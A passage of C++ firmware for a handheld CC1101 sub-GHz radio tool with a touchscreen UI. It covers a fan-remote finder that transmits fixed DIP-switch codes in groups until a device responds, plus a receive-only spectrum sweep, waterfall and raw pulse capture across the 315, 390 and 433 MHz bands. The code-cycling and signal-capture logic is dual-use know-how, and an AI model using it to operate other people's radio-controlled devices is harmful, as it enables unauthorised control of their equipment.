  dip_fan_candidate_sent = false;
  refresh_dip_fan_config();
}


void dip_fan_use_regency(lv_event_t *e) {
  fixed_code_family = FIXED_CODE_FAMILY_REGENCY;
  dip_fan_profile_index = 7;
  dip_fan_uses_five_switches = false;
  dip_fan_address = 0;
  dip_fan_candidate_sent = false;
  dip_fan_group_mode = DIP_FAN_GROUP_OFF;
  refresh_dip_fan_config();
}


void dip_fan_toggle_switch(lv_event_t *e) {
  const uint8_t switch_index = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  const uint8_t switch_count = dip_fan_switch_count();
  if (switch_index >= switch_count) return;
  dip_fan_group_mode = DIP_FAN_GROUP_OFF;
  dip_fan_address ^= (1U << (switch_count - 1 - switch_index));
  dip_fan_candidate_sent = false;
  refresh_dip_fan_config();
}


void close_dip_fan_config(lv_event_t *e) {
  refresh_dip_fan_discovery();
  lv_scr_load(dip_fan_discovery_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void create_dip_fan_config_screen() {
  dip_fan_config_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(dip_fan_config_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(dip_fan_config_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(dip_fan_config_screen, true);
  create_header(dip_fan_config_screen, "FIXED-CODE CONFIG");

  dip_fan_config_label = lv_label_create(dip_fan_config_screen);
  lv_obj_set_width(dip_fan_config_label, 290);
  lv_obj_set_style_text_color(dip_fan_config_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(dip_fan_config_label, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_set_style_text_align(dip_fan_config_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(dip_fan_config_label, LV_ALIGN_TOP_MID, 0, 98);

  create_button(dip_fan_config_screen, 10, 164, 94, 30, "TRI-STATE", COLOR_RF,
                dip_fan_use_tristate);
  create_button(dip_fan_config_screen, 113, 164, 94, 30, "EV1527", COLOR_SETTINGS,
                dip_fan_use_ev1527);
  create_button(dip_fan_config_screen, 216, 164, 94, 30, "REGENCY", COLOR_GREEN,
                dip_fan_use_regency);
  create_button(dip_fan_config_screen, 28, 202, 126, 30, "4 SWITCHES", COLOR_RF,
                dip_fan_use_four_switches);
  create_button(dip_fan_config_screen, 166, 202, 126, 30, "5 SWITCHES", COLOR_RF,
                dip_fan_use_five_switches);

  for (uint8_t i = 0; i < 5; i++) {
    dip_fan_bit_buttons[i] = create_button(dip_fan_config_screen, 12 + i * 60, 242,
                                            56, 56, "DIP", COLOR_SETTINGS, NULL);
    lv_obj_add_event_cb(dip_fan_bit_buttons[i], dip_fan_toggle_switch,
                        LV_EVENT_CLICKED, (void *)(uintptr_t)i);
  }

  create_button(dip_fan_config_screen, 35, 312, 250, 42, "USE THIS CONFIG", COLOR_GREEN,
                close_dip_fan_config);
  create_button(dip_fan_config_screen, 70, 374, 180, 34, "BACK", COLOR_RED,
                close_dip_fan_config);
  create_footer(dip_fan_config_screen);
  refresh_dip_fan_config();
}


void create_dip_fan_discovery_screen() {
  dip_fan_discovery_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(dip_fan_discovery_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(dip_fan_discovery_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(dip_fan_discovery_screen, true);
  create_header(dip_fan_discovery_screen, "FIND DEVICE CONTROLS");

  dip_fan_state_label = lv_label_create(dip_fan_discovery_screen);
  lv_obj_set_width(dip_fan_state_label, 290);
  lv_obj_set_style_text_color(dip_fan_state_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(dip_fan_state_label, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_set_style_text_align(dip_fan_state_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(dip_fan_state_label, LV_ALIGN_TOP_MID, 0, 98);

  dip_fan_hint_label = lv_label_create(dip_fan_discovery_screen);
  lv_obj_set_width(dip_fan_hint_label, 290);
  lv_obj_set_style_text_color(dip_fan_hint_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(dip_fan_hint_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(dip_fan_hint_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(dip_fan_hint_label, LV_ALIGN_TOP_MID, 0, 168);

  create_button(dip_fan_discovery_screen, 8, 226, 72, 38, "433", COLOR_RF, dip_fan_select_433);
  create_button(dip_fan_discovery_screen, 85, 226, 72, 38, "315", COLOR_RF, dip_fan_select_315);
  create_button(dip_fan_discovery_screen, 162, 226, 72, 38, "304", COLOR_GREEN, dip_fan_select_304);
  create_button(dip_fan_discovery_screen, 239, 226, 72, 38, "CODE", COLOR_SETTINGS,
                open_dip_fan_config);
  create_button(dip_fan_discovery_screen, 15, 274, 140, 42, "TEST ONE", COLOR_GREEN,
                dip_fan_send_test);
  create_button(dip_fan_discovery_screen, 165, 274, 140, 42, "START / NEXT GROUP", COLOR_RF,
                dip_fan_send_group);
  create_button(dip_fan_discovery_screen, 20, 326, 135, 38, "YES", COLOR_GREEN, dip_fan_worked);
  create_button(dip_fan_discovery_screen, 165, 326, 135, 38, "NO", COLOR_SETTINGS, dip_fan_no_response);
  create_button(dip_fan_discovery_screen, 10, 374, 88, 34, "FINISH", COLOR_SAVED,
                dip_fan_save_remote);
  create_button(dip_fan_discovery_screen, 104, 374, 132, 34, "ADVANCED CODE", COLOR_RF,
                open_dip_fan_config);
  create_button(dip_fan_discovery_screen, 242, 374, 68, 34, "BACK", COLOR_RED,
                open_discovery);
  create_footer(dip_fan_discovery_screen);
  refresh_dip_fan_discovery();
}


// ============================================================
// CREATE RF MAIN SCREEN
// ============================================================

void refresh_rf_profile_screen() {
  if (rf_profile_active_label == NULL) return;

  const uint8_t active_profile_index = safe_rf_profile_index();
  const RFProfilePreset &active = RF_PROFILES[active_profile_index];
  char profile_text[128];
  if (rf_profile_suggested_index >= 0 && rf_profile_suggested_index < RF_PROFILE_COUNT &&
      rf_profile_suggested_index != active_profile_index) {
    snprintf(profile_text, sizeof(profile_text),
             "ACTIVE: %s\nSUGGESTED: %s\nNEXT: OPEN RF ANALYSIS",
             active.name,
             RF_PROFILES[rf_profile_suggested_index].name);
  } else {
    snprintf(profile_text, sizeof(profile_text),
             "ACTIVE: %s\nMODE: %s\nNEXT: ANALYZE, HOLD BUTTON 2 SEC",
             active.name, active.ook ? "OOK" : "FSK");
  }
  lv_label_set_text(rf_profile_active_label, profile_text);
}


void select_rf_profile(lv_event_t *e) {
  uint8_t requested_profile = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  if (rf_capture_active) {
    set_status("RF CAPTURE BUSY", COLOR_RED);
    return;
  }
  if (requested_profile == rf_profile_index) {
    set_status("PROFILE ALREADY ACTIVE", COLOR_READY);
    return;
  }
  if ((uint32_t)(millis() - rf_profile_last_change_ms) < 600) {
    set_status("WAIT BEFORE CHANGING PROFILE", COLOR_MUTED);
    return;
  }
  rf_profile_last_change_ms = millis();
  if (apply_rf_profile(requested_profile)) {
    persist_rf_profile_preference();
    refresh_rf_profile_screen();
    refresh_rf_scope_labels();
    set_status("PROFILE ACTIVE", COLOR_GREEN);
  } else {
    set_status("PROFILE SET FAILED", COLOR_RED);
  }
}


void open_rf_profile(lv_event_t *e) {
  stop_live_rf_scanner();
  if (rf_profile_screen == NULL) create_rf_profile_screen();
  refresh_rf_profile_screen();
  lv_scr_load(rf_profile_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void close_rf_profile(lv_event_t *e) {
  lv_scr_load(rf_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void create_rf_profile_screen() {
  rf_profile_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(rf_profile_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(rf_profile_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(rf_profile_screen, true);
  create_header(rf_profile_screen, "RF PROFILE");

  rf_profile_active_label = lv_label_create(rf_profile_screen);
  lv_obj_set_width(rf_profile_active_label, 300);
  lv_obj_set_style_text_color(rf_profile_active_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(rf_profile_active_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(rf_profile_active_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(rf_profile_active_label, LV_ALIGN_TOP_MID, 0, 92);

  lv_obj_t *profile_list = lv_obj_create(rf_profile_screen);
  lv_obj_set_size(profile_list, 300, 210);
  lv_obj_set_pos(profile_list, 10, 138);
  lv_obj_set_style_pad_all(profile_list, 4, LV_PART_MAIN);
  lv_obj_set_style_bg_color(profile_list, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(profile_list, lv_color_hex(COLOR_RF), LV_PART_MAIN);
  lv_obj_set_style_border_width(profile_list, 1, LV_PART_MAIN);
  lv_obj_set_scroll_dir(profile_list, LV_DIR_VER);
  for (uint8_t i = 0; i < RF_PROFILE_COUNT; i++) {
    const int column = i % 2;
    const int row = i / 2;
    lv_obj_t *button = create_button(profile_list, 3 + column * 145, 3 + row * 39,
                                     137, 34, RF_PROFILES[i].name,
                                     i == rf_profile_index ? COLOR_GREEN : COLOR_RF,
                                     NULL);
    lv_obj_t *label = lv_obj_get_child(button, 0);
    lv_obj_set_width(label, 129);
    lv_label_set_long_mode(label, LV_LABEL_LONG_DOT);
    lv_obj_set_style_text_font(label, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_add_event_cb(button, select_rf_profile, LV_EVENT_CLICKED,
                        (void *)(uintptr_t)i);
  }

  create_button(rf_profile_screen, 80, 365, 160, 34, "<  RF TOOLS", COLOR_RF,
                close_rf_profile);
  create_footer(rf_profile_screen);
}

void refresh_rf_scope_labels() {
  if (rf_scope_profile_label == NULL || rf_scope_rssi_label == NULL) return;
  const RFProfilePreset &profile = RF_PROFILES[safe_rf_profile_index()];
  if (rf_scope_tab == 0) {
    lv_label_set_text_fmt(rf_scope_profile_label, "LIVE BAND\n%.2f MHz",
                          profile.frequency);
    lv_label_set_text_fmt(rf_scope_rssi_label, "SIGNAL\n%.1f dBm",
                          cc1101_ready ? rf_profile_last_rssi : -140.0f);
  } else if (rf_scope_tab == 2) {
    refresh_rf_scope_details();
  }
}


void set_rf_scope_caption(const char *text) {
  if (rf_scope_caption_label != NULL) {
    lv_label_set_text(rf_scope_caption_label, text);
  }
}


void set_rf_scope_state(const char *state, uint32_t color) {
  // The shared header already provides a state dot/text row on the left and
  // the actual AXP2101 battery readout on the right. Reuse it rather than
  // adding another label across the battery coordinates.
  set_status(state, color);
}


uint32_t rf_scope_waterfall_color(uint8_t level) {
  if (level >= 82) return COLOR_SAVED;      // amber: strongest recent activity
  if (level >= 64) return COLOR_GREEN;
  if (level >= 43) return COLOR_BLUETOOTH;  // cyan: moderate activity
  if (level >= 22) return COLOR_RF;         // blue/purple: weak activity
  return COLOR_PANEL;
}


void clear_rf_scope_waterfall() {
  memset(rf_scope_waterfall_levels, 0, sizeof(rf_scope_waterfall_levels));
  for (uint8_t row = 0; row < RF_SCOPE_WATERFALL_ROWS; row++) {
    for (uint8_t column = 0; column < RF_SCOPE_BAR_COUNT; column++) {
      if (rf_scope_waterfall_cells[row][column] == NULL) continue;
      lv_obj_set_style_bg_color(rf_scope_waterfall_cells[row][column],
                                lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
    }
  }
}


void push_rf_scope_waterfall() {
  memmove(&rf_scope_waterfall_levels[1][0], &rf_scope_waterfall_levels[0][0],
          (RF_SCOPE_WATERFALL_ROWS - 1) * RF_SCOPE_BAR_COUNT);
  memcpy(rf_scope_waterfall_levels[0], rf_scope_levels, RF_SCOPE_BAR_COUNT);
  for (uint8_t row = 0; row < RF_SCOPE_WATERFALL_ROWS; row++) {
    for (uint8_t column = 0; column < RF_SCOPE_BAR_COUNT; column++) {
      if (rf_scope_waterfall_cells[row][column] == NULL) continue;
      lv_obj_set_style_bg_color(rf_scope_waterfall_cells[row][column],
        lv_color_hex(rf_scope_waterfall_color(rf_scope_waterfall_levels[row][column])),
        LV_PART_MAIN);
    }
  }
}


void refresh_rf_scope_details() {
  if (rf_scope_details_label == NULL) return;
  const uint8_t safe_profile_index =
    rf_profile_index < RF_PROFILE_COUNT ? rf_profile_index : 0;
  const RFProfilePreset &profile = RF_PROFILES[safe_profile_index];
  char details[420];
  if (!rf_scope_report_ready) {
    snprintf(details, sizeof(details),
      "FREQUENCY     %.3f MHz\n"
      "PEAK RSSI     %.1f dBm\n"
      "SIGNAL TYPE   %s\n"
      "STATUS        SCAN TO ANALYZE\n\n"
      "SWEPT CC1101 RSSI / ACTIVITY\n"
      "No protocol is confirmed yet.",
      rf_scope_capture_frequency > 0.0f ? rf_scope_capture_frequency : profile.frequency,
      rf_scope_peak_rssi, profile.name != NULL ? profile.name : "UNKNOWN");
    lv_label_set_text(rf_scope_details_label, details);
    return;
  }
  snprintf(details, sizeof(details),
    "FREQUENCY     %.3f MHz\n"
    "PEAK RSSI     %.1f dBm\n"
    "SIGNAL TYPE   %s\n"
    "EDGES         %u\n"
    "PULSE RANGE   %lu-%lu us\n"
    "BIT TIME      ~%lu us\n"
    "REPEAT        %s\n"
    "STATUS        CAPTURED, NOT PROTOCOL-DECODED",
    rf_scope_capture_frequency, rf_capture_peak_rssi, rf_scope_report_profile,
    rf_scope_report_edges, (unsigned long)rf_scope_report_shortest,
    (unsigned long)rf_scope_report_longest, (unsigned long)rf_scope_report_bit_us,
    rf_scope_report_repeats ? "FOUND" : "NOT FOUND");
  lv_label_set_text(rf_scope_details_label, details);
}


void update_rf_scope_peak_marker() {
  if (rf_scope_peak_marker == NULL) return;
  uint8_t peak_column = 0;
  for (uint8_t i = 1; i < RF_SCOPE_BAR_COUNT; i++) {
    if (rf_scope_levels[i] > rf_scope_levels[peak_column]) peak_column = i;
  }
  lv_obj_set_x(rf_scope_peak_marker, 12 + peak_column * 8);
}


void refresh_rf_scope_tab() {
  const bool show_details = rf_scope_tab == 2;
  const bool show_spectrum = rf_scope_tab == 0;
  if (rf_scope_panel != NULL) {
    if (show_details) lv_obj_add_flag(rf_scope_panel, LV_OBJ_FLAG_HIDDEN);
    else lv_obj_clear_flag(rf_scope_panel, LV_OBJ_FLAG_HIDDEN);
  }
  if (rf_scope_waterfall_panel != NULL) {
    if (show_spectrum) lv_obj_clear_flag(rf_scope_waterfall_panel, LV_OBJ_FLAG_HIDDEN);
    else lv_obj_add_flag(rf_scope_waterfall_panel, LV_OBJ_FLAG_HIDDEN);
  }
  if (rf_scope_details_panel != NULL) {
    if (show_details) lv_obj_clear_flag(rf_scope_details_panel, LV_OBJ_FLAG_HIDDEN);
    else lv_obj_add_flag(rf_scope_details_panel, LV_OBJ_FLAG_HIDDEN);
  }
  if (rf_scope_peak_marker != NULL) {
    if (show_spectrum) lv_obj_clear_flag(rf_scope_peak_marker, LV_OBJ_FLAG_HIDDEN);
    else lv_obj_add_flag(rf_scope_peak_marker, LV_OBJ_FLAG_HIDDEN);
  }
  if (rf_scope_waveform_message != NULL) {
    if (rf_scope_tab == 1 && !rf_scope_capture_mode && !rf_scope_report_ready) {
      lv_obj_clear_flag(rf_scope_waveform_message, LV_OBJ_FLAG_HIDDEN);
    } else {
      lv_obj_add_flag(rf_scope_waveform_message, LV_OBJ_FLAG_HIDDEN);
    }
  }

  for (uint8_t i = 0; i < 3; i++) {
    if (rf_scope_tab_buttons[i] == NULL) continue;
    const bool selected = i == rf_scope_tab;
    lv_obj_set_style_bg_color(rf_scope_tab_buttons[i],
      lv_color_hex(selected ? COLOR_PANEL2 : COLOR_PANEL), LV_PART_MAIN);
    lv_obj_set_style_border_color(rf_scope_tab_buttons[i],
      lv_color_hex(selected ? COLOR_GREEN : COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_shadow_width(rf_scope_tab_buttons[i], selected ? 4 : 0, LV_PART_MAIN);
    lv_obj_t *label = lv_obj_get_child(rf_scope_tab_buttons[i], 0);
    if (label != NULL) {
      lv_obj_set_style_text_color(label,
        lv_color_hex(selected ? COLOR_GREEN : COLOR_TEXT), LV_PART_MAIN);
    }
  }
  if (show_details) refresh_rf_scope_details();
  update_rf_scope_peak_marker();
}


void select_rf_scope_tab(lv_event_t *e) {
  if (rf_scope_capture_mode) {
    set_status("CAPTURE IN PROGRESS", COLOR_RED);
    return;
  }
  const uint8_t requested_tab = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  if (requested_tab == 1 && !rf_scope_report_ready) {
    rf_scope_tab = 1;
    if (rf_scope_axis_label != NULL) {
      lv_label_set_text(rf_scope_axis_label, "NO WAVEFORM YET - SCAN AND CAPTURE A SIGNAL");
    }
    set_rf_scope_caption(rf_scope_frequency_locked ?
      "SIGNAL LOCKED - TAP CAPTURE WAVE" : "NO WAVEFORM YET - RUN A SCAN FIRST");
    refresh_rf_scope_tab();
    return;
  }

  rf_scope_tab = requested_tab;
  if (rf_scope_tab == 0 && cc1101_ready && !rf_capture_active &&
      rf_scope_mode != RF_SCOPE_MODE_SWEEP) {
#if CC1101_ACCESS_ENABLED
    if (cc1101.receiveDirectAsync() == RADIOLIB_ERR_NONE) {
      rf_scope_mode = RF_SCOPE_MODE_LIVE;
      rf_scope_active = true;
      set_status("LISTENING", COLOR_RF);
    }
#endif
  }
  refresh_rf_scope_tab();
}


void clear_rf_scope_bars() {
  for (uint8_t i = 0; i < RF_SCOPE_BAR_COUNT; i++) {
    rf_scope_levels[i] = 0;
    if (rf_scope_bars[i] == NULL) continue;
    lv_obj_set_size(rf_scope_bars[i], 6, 4);
    lv_obj_set_pos(rf_scope_bars[i], 10 + i * 8, 70);
    lv_obj_set_style_bg_color(rf_scope_bars[i], lv_color_hex(COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(rf_scope_bars[i], LV_OPA_30, LV_PART_MAIN);
  }
  update_rf_scope_peak_marker();
}


void render_rf_scope_pulse_trace(uint16_t edges) {
  if (edges == 0) return;

  // Compress the captured GDO0 envelope to the panel width. This is a real
  // time-domain view of the demodulated OOK/ASK data, not a protocol decoder.
  uint16_t visible_edges = edges > 160 ? 160 : edges;
  uint32_t total_us = 0;
  for (uint16_t i = 0; i < visible_edges; i++) total_us += rf_capture_durations[i];
  if (total_us == 0) total_us = 1;

  uint16_t edge_index = 0;
  uint32_t edge_end_us = rf_capture_durations[0];
  for (uint8_t column = 0; column < RF_SCOPE_BAR_COUNT; column++) {
    uint32_t sample_us = (total_us * (uint32_t)(column * 2 + 1)) /
                         (RF_SCOPE_BAR_COUNT * 2);
    while (edge_index + 1 < visible_edges && sample_us >= edge_end_us) {
      edge_index++;
      edge_end_us += rf_capture_durations[edge_index];
    }
    bool high = rf_capture_levels[edge_index] != 0;
    lv_obj_t *bar = rf_scope_bars[column];
    if (bar == NULL) continue;
    uint16_t height = high ? 56 : 6;
    lv_obj_set_size(bar, 6, height);
    lv_obj_set_pos(bar, 10 + column * 8, high ? 10 : 64);
    lv_obj_set_style_bg_color(bar,
      lv_color_hex(high ? COLOR_GREEN : COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(bar, high ? LV_OPA_90 : LV_OPA_40, LV_PART_MAIN);
  }
  if (rf_scope_axis_label != NULL) {
    lv_label_set_text(rf_scope_axis_label, "RAW GDO0 PULSE ENVELOPE");
  }
}


void render_rf_scope_sweep(float start_mhz, float stop_mhz, float best_mhz,
                           float best_rssi) {
  for (uint8_t i = 0; i < RF_SCOPE_BAR_COUNT; i++) {
    lv_obj_t *bar = rf_scope_bars[i];
    if (bar == NULL) continue;
    uint16_t height = 4 + (rf_scope_levels[i] * 66) / 100;
    lv_obj_set_size(bar, 6, height);
    lv_obj_set_pos(bar, 10 + i * 8, 70 - height);
    lv_obj_set_style_bg_color(bar,
      lv_color_hex(rf_scope_levels[i] >= 65 ? COLOR_GREEN : COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(bar, LV_OPA_70, LV_PART_MAIN);
  }
  update_rf_scope_peak_marker();
  if (rf_scope_axis_label != NULL) {
    lv_label_set_text_fmt(rf_scope_axis_label, "%.1f MHz                 %.1f MHz",
                          start_mhz, stop_mhz);
  }
  lv_label_set_text_fmt(rf_scope_profile_label, "%.0f - %.0f MHz COARSE SWEEP",
                        start_mhz, stop_mhz);
  lv_label_set_text_fmt(rf_scope_rssi_label, "PEAK RSSI\n%.1f dBm", best_rssi);
  set_rf_scope_caption("COARSE RSSI SWEEP / NOT A DECODE");
}


void run_rf_scope_sweep(float start_mhz, float stop_mhz, uint8_t profile_index) {
#if !CC1101_ACCESS_ENABLED
  (void)start_mhz;
  (void)stop_mhz;
  (void)profile_index;
  return;
#else
  if (!cc1101_ready || rf_capture_active) {
    set_status("CC1101 NOT READY", COLOR_RED);
    return;
  }

  rf_scope_active = false;
  rf_scope_capture_mode = false;
  rf_scope_mode = RF_SCOPE_MODE_SWEEP;
  set_rf_scope_state(rf_scope_fine_refining ? "REFINING" :
                     (rf_scope_waterfall_live ? "LIVE SWEEP" : "SCANNING"), COLOR_RF);
  cc1101.packetMode();
  if (!rf_scope_auto_analyze || rf_scope_auto_band == 0 || rf_scope_fine_refining) clear_rf_scope_bars();
  lv_label_set_text_fmt(rf_scope_profile_label, "SCANNING %.0f - %.0f MHz", start_mhz, stop_mhz);
  lv_label_set_text(rf_scope_rssi_label, rf_scope_waterfall_live ?
                    "LIVE WATERFALL\n0% COMPLETE" :
                    "HOLD REMOTE BUTTON\n0% COMPLETE");
  set_rf_scope_caption(rf_scope_fine_refining ?
    "REFINING THE STRONGEST SIGNAL" :
    (rf_scope_waterfall_live ? "CONTINUOUS RECEIVE-ONLY SWEEP" :
                               "HOLD ONE REMOTE BUTTON - SWEEP IN PROGRESS"));
  if (rf_scope_axis_label != NULL) {
    lv_label_set_text_fmt(rf_scope_axis_label, "%.1f MHz                 %.1f MHz",
                          start_mhz, stop_mhz);
  }
  if (!apply_rf_profile(profile_index, false)) {
    set_status("RF SWEEP START FAILED", COLOR_RED);
    rf_scope_mode = RF_SCOPE_MODE_LIVE;
    rf_scope_active = true;
    return;
  }
  rf_scope_sweep_start_mhz = start_mhz;
  rf_scope_sweep_stop_mhz = stop_mhz;
  rf_scope_sweep_best_mhz = start_mhz;
  rf_scope_sweep_best_rssi = -140.0f;
  rf_scope_sweep_profile_index = profile_index;
  rf_scope_sweep_index = 0;
  rf_scope_sweep_column_count = rf_scope_fine_refining ? RF_SCOPE_BAR_COUNT :
                                (rf_scope_auto_analyze ? 10 : RF_SCOPE_BAR_COUNT);
  rf_scope_sweep_column_offset = rf_scope_fine_refining ? 0 :
                                 (rf_scope_auto_analyze ? rf_scope_auto_band * 10 : 0);
  rf_scope_sweep_next_ms = millis();
  // Force the new instructions onto the LCD before the first radio step.
  lv_timer_handler();
#endif
}


void run_rf_scope_315_sweep(lv_event_t *e) {
  run_rf_scope_sweep(304.0f, 326.0f, 6);
}


void run_rf_scope_390_sweep(lv_event_t *e) {
  // Security+ 2.0 devices are commonly found around 315 or 390 MHz.  This is
  // a receive-only RSSI sweep; it does not record, replay, or generate access
  // codes.
  run_rf_scope_sweep(380.0f, 400.0f, 3);
}


void run_rf_scope_433_sweep(lv_event_t *e) {
  run_rf_scope_sweep(420.0f, 447.0f, 2);
}


void start_rf_scan_and_analyze(lv_event_t *e) {
  // A tap on SCAN intentionally interrupts the continuously scrolling preview
  // sweep and hands the radio to the full analyze/refine/capture sequence.
  if (rf_scope_waterfall_live && rf_scope_mode == RF_SCOPE_MODE_SWEEP) {
    rf_scope_waterfall_live = false;
    rf_scope_mode = RF_SCOPE_MODE_LIVE;
#if CC1101_ACCESS_ENABLED
    if (cc1101_ready) cc1101.packetMode();
#endif
  }
  if (!cc1101_ready || rf_capture_active || rf_scope_mode == RF_SCOPE_MODE_SWEEP) {
    set_status("RF ANALYZER BUSY", COLOR_RED);
    return;
  }
  if (rf_scope_screen == NULL) create_rf_scope_screen();
  rf_scope_waterfall_live = false;
  rf_scope_auto_analyze = true;
  rf_scope_fine_refining = false;
  rf_scope_auto_band = 0;
  rf_scope_auto_best_mhz = 0.0f;
  rf_scope_auto_best_rssi = -140.0f;
  rf_scope_auto_best_profile = 6;
  rf_scope_frequency_locked = false;
  rf_scope_report_ready = false;
  rf_scope_tab = 0;
  clear_rf_scope_waterfall();
  set_rf_scope_state("SCANNING", COLOR_RF);
  if (rf_scope_scan_button != NULL) {
    lv_label_set_text(lv_obj_get_child(rf_scope_scan_button, 0), "SCANNING...");
  }
  refresh_rf_scope_tab();
  lv_obj_add_flag(rf_scope_lock_button, LV_OBJ_FLAG_HIDDEN);
  lv_obj_add_flag(rf_scope_capture_button, LV_OBJ_FLAG_HIDDEN);
  lv_obj_add_flag(rf_scope_save_button, LV_OBJ_FLAG_HIDDEN);
  lv_label_set_text(rf_scope_rssi_label,
                    "HOLD BUTTON\nUNTIL FINISHED");
  set_rf_scope_caption("315 BAND | 390 BAND | 433/434 BAND");
  run_rf_scope_sweep(304.0f, 326.0f, 6);
}


void update_rf_scope_sweep() {
#if CC1101_ACCESS_ENABLED
  if (rf_scope_mode != RF_SCOPE_MODE_SWEEP || rf_scope_sweep_index >= rf_scope_sweep_column_count) return;
  if ((int32_t)(millis() - rf_scope_sweep_next_ms) < 0) return;

  const uint8_t i = rf_scope_sweep_index;
  const float fraction = rf_scope_sweep_column_count > 1 ?
    (float)i / (rf_scope_sweep_column_count - 1) : 0.0f;
  const float frequency = rf_scope_sweep_start_mhz +
    (rf_scope_sweep_stop_mhz - rf_scope_sweep_start_mhz) * fraction;
  float peak = -140.0f;
  if (cc1101.setFrequency(frequency) == RADIOLIB_ERR_NONE &&
      cc1101.receiveDirectAsync() == RADIOLIB_ERR_NONE) {
    delay(24);
    for (uint8_t sample = 0; sample < 3; sample++) {
      const float rssi = cc1101.getRSSI();
      if (rssi > peak) peak = rssi;
      delay(5);
    }
    cc1101.packetMode();
  }

  int level = (int)((peak + 105.0f) * 100.0f / 80.0f);
  if (level < 0) level = 0;
  if (level > 100) level = 100;
  const uint8_t column = rf_scope_sweep_column_offset + i;
  rf_scope_levels[column] = (uint8_t)level;
  if (peak > rf_scope_sweep_best_rssi) {
    rf_scope_sweep_best_rssi = peak;
    rf_scope_sweep_best_mhz = frequency;
  }

  lv_obj_t *bar = rf_scope_bars[column];
  if (bar != NULL) {
    const uint16_t height = 4 + (rf_scope_levels[column] * 66) / 100;
    lv_obj_set_size(bar, 6, height);
    lv_obj_set_pos(bar, 10 + column * 8, 70 - height);
    lv_obj_set_style_bg_color(bar,
      lv_color_hex(level >= 65 ? COLOR_GREEN : COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(bar, LV_OPA_70, LV_PART_MAIN);
  }
  update_rf_scope_peak_marker();

  rf_scope_sweep_index++;
  const uint8_t progress = (uint16_t)rf_scope_sweep_index * 100U / rf_scope_sweep_column_count;
  lv_label_set_text_fmt(rf_scope_rssi_label, "SWEEPING RSSI\n%u%% COMPLETE", progress);
  rf_scope_sweep_next_ms = millis() + 8;
  if (rf_scope_auto_analyze) {
    const uint8_t overall_progress = rf_scope_fine_refining ?
      66U + progress / 3U : (rf_scope_auto_band * 33U) + progress / 3U;
    lv_label_set_text_fmt(rf_scope_rssi_label, "%s\n%u%% COMPLETE",
                          rf_scope_fine_refining ? "REFINING PEAK" : "SWEEPING RSSI",
                          overall_progress);
  }

  if (rf_scope_sweep_index < rf_scope_sweep_column_count) return;

  if (rf_scope_auto_analyze && rf_scope_sweep_best_rssi > rf_scope_auto_best_rssi) {
    rf_scope_auto_best_rssi = rf_scope_sweep_best_rssi;
    rf_scope_auto_best_mhz = rf_scope_sweep_best_mhz;
    rf_scope_auto_best_profile = rf_scope_sweep_profile_index;
  }

  // Completed measurement slices become newest-first bounded waterfall rows.
  push_rf_scope_waterfall();

  // In the normal Spectrum view, keep sweeping the three supported bands so
  // the waterfall actually scrolls.  The explicit SCAN button disables this
  // background loop and continues through the proven analyze/capture flow.
  if (rf_scope_waterfall_live && !rf_scope_auto_analyze) {
    render_rf_scope_sweep(rf_scope_sweep_start_mhz, rf_scope_sweep_stop_mhz,
                          rf_scope_sweep_best_mhz, rf_scope_sweep_best_rssi);
    rf_scope_waterfall_band = (rf_scope_waterfall_band + 1U) % 3U;
    if (rf_scope_waterfall_band == 0) run_rf_scope_sweep(304.0f, 326.0f, 6);
    else if (rf_scope_waterfall_band == 1) run_rf_scope_sweep(380.0f, 400.0f, 3);
    else run_rf_scope_sweep(420.0f, 447.0f, 2);
    return;
  }

  if (rf_scope_auto_analyze && !rf_scope_fine_refining && rf_scope_auto_band < 2) {
    rf_scope_auto_band++;
    if (rf_scope_auto_band == 1) {
      set_rf_scope_caption("315 DONE | SCANNING 390 | 433/434 NEXT");
      run_rf_scope_sweep(380.0f, 400.0f, 3);
    } else {
      set_rf_scope_caption("315 + 390 DONE | SCANNING 433/434");
      run_rf_scope_sweep(420.0f, 447.0f, 2);
    }
    return;
  }

  if (rf_scope_auto_analyze && !rf_scope_fine_refining) {
    if (rf_scope_auto_best_rssi <= -105.0f) {
      rf_scope_auto_analyze = false;
      rf_scope_mode = RF_SCOPE_MODE_LIVE;
      set_rf_scope_state("NO SIGNAL", COLOR_RED);
